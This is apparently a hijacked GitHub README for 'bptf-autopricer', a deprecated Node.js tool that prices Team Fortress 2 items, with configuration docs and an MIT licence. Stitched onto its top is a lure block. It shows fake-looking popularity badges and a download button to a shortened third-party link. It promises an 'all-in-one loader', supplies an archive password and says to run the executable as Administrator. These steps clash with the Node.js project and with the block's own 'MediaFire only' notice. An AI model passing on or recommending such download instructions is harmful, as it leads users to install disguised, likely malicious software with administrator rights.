<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://linkolla.com/2474b9">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# Deprecated - No Longer Supported
`bptf-autopricer` will **no longer be supported** - the application no longer works as it depends upon prices.tf for a baseline to compare generated prices to, which has since shut down. 

## Requirements
- Install dependencies by running `npm install` in the project directory with package.json.
- A PostgreSQL database is required. You have **two** options in setting this up.
## Configuration
To configure the application you need to specify the values for all the fields in `config.json`.
```JSON
{
    "bptfAPIKey": "your bptf api key",
    "bptfToken": "your bptf token",
    "steamAPIKey": "your steam api key",
    "database": {
        "schema": "tf2",
        "host": "localhost",
        "port": 5432,
        "name": "bptf-autopricer",
        "user": "postgres",
        "password": "database password"
    },
    "pricerPort": 3456,
    "maxPercentageDifferences": {
        "buy": 5,
        "sell": -8
    },
    "alwaysQuerySnapshotAPI": true,
    "excludedSteamIDs": [
        "76561199384015307"
    ],
    "trustedSteamIDs": [
        "76561199110778355"
    ],
    "excludedListingDescriptions": [
        "exorcism",
    ]
}
```
The majority of these fields are self-explanatory. I will explain the ones that may not be.

### `maxPercentageDifferences`
Contains two fields, `buy` and `sell`. These values represent the maximum difference from the baseline (prices.tf) you will accept before a price is rejected. Adjust the maximum percentage differences for buy and sell according to your preferences.
- A higher **buy** percentage means that the auto pricer is willing to buy items for a higher price than prices.tf.
- A lower **sell** percentage means that the auto pricer is willing to sell items for a lower price than prices.tf.
  
The default in the config is the settings I used while using this auto pricer with a trading bot.
  
```JSON
"maxPercentageDifferences": {
  "buy": 5,
  "sell": -8
}
```

### `excludedSteamIDs`
A list of Steam ID 64s that you don't want to use the listings of in pricing calculations. This is useful for stopping bad actors that you know of from attempting to manipulate the prices created. It's important to note that this is not a fool-proof solution and because of this other methods are also used to reduce the risks of price manipulation.

```JSON
"excludedSteamIDs": [
    "76561199384015307"
]
```

### `trustedSteamIDs`
A list of Steam ID 64s used to prioritise listings owned by these IDs over others during pricing calculations. This feature is beneficial when you want to give preference to bots or users that consistently provide accurate pricing data.

```JSON
"trustedSteamIDs": [
    "76561199110778355"
]
```

### `excludedListingDescriptions`
A list of descriptions that, when detected within a listing's details, causes the listing to be disregarded and not used during pricing calculations. This is useful for excluding listings involving items with 'special attributes,' such as spells, when calculating prices. Leaving such listings in the calculations can risk affecting the average price in unexpected ways.

```JSON
"excludedListingDescriptions": [
    "exorcism",
]
```

### `alwaysQuerySnapshotAPI`

This setting determines whether the pricer should consistently call the snapshot API for each item during the pricing process, regardless of the number of listings available in the database. By default, this setting is set to `true`.

#### Behavior:

- **true**: The pricer always calls the snapshot API for every item, ensuring the most up-to-date information. However, this may result in slower pricing processes due to the API rate limits.

- **false**: The pricer avoids unnecessary API calls if there are already a suitable number of listings in the database to generate a price. This speeds up the pricing process significantly as it bypasses the need to call the snapshot API. However, there are trade-offs to consider:

#### Trade-offs:

1. **Accuracy vs. Speed**: By setting `alwaysQuerySnapshotAPI` to `false`, the pricing process becomes faster but may use a smaller pool of listings to calculate prices. The logic ensures that if there are at least 10 buy listings and 1 sell listing, no further data retrieval is attempted.

2. **Timeliness of Data**: When the API is not called every time, there's a risk of using listings with prices that are up to approximately 35 minutes old, in the worst-case scenario.

#### Benefits:

- **Improved Performance**: Setting `alwaysQuerySnapshotAPI` to `false` makes the pricer more efficient, especially when dealing with large item lists, as it avoids the minimum 2-second wait time per item.

Consider your requirements for pricing accuracy, speed, and data freshness when configuring this setting.

```JSON
"alwaysQuerySnapshotAPI": true
```

## API Routes & Socket IO
The socket io server will emit events called 'price' with an item object as the value. The item objects are structured like the following:
```JSON
{
  "name": "Strange Australium Minigun",
  "sku": "202;11;australium",
  "source": "bptf",
  "time": 1700403492,
  "buy": {
    "keys": 25,
    "metal": 21.33
  },
  "sell": {
    "keys": 26,
    "metal": 61.77
  }
}
```
- Note that the same JSON structure is used when an item or an array of items is returned by the API.
## Running the Auto Pricer
Once all the requirements have been met, and you have provided the values required in config.json, simply run:
```
node bptf-autopricer.js
```

## FAQ
- Q: How do I connect this to TF2AutoBot?


---

MIT License

Copyright (c) 2023 Jack Samuel Richards

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
